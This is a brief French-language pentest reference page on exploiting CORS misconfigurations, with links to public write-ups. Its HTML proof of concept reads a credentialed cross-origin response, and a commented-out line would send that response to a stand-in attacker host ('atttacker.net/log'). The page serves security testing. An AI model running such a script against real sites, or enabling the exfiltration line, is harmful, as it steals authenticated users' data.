---
title: Cross-Origin Ressource Sharing
permalink: /CORS/
---

# Cross Origin Ressource Sharing (CORS)

## Script

Le script suivant permet de faire un PoC rapide (repris de https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties=)

``` html
<html>

<script>
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','http://perdu.com',true); 
req.withCredentials = true;
req.send();


function reqListener() {
    //location='//atttacker.net/log?key='+this.responseText; 
	alert(this.responseText);
};
</script>

</html>
```


## Ressources

- [Advanced CORS Exploitation Techniques](https://www.sxcurity.pro/advanced-cors-techniques/)
- [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [CORS misconfigurations](https://github.com/EdOverflow/bugbountywiki/wiki/CORS-misconfigurations)
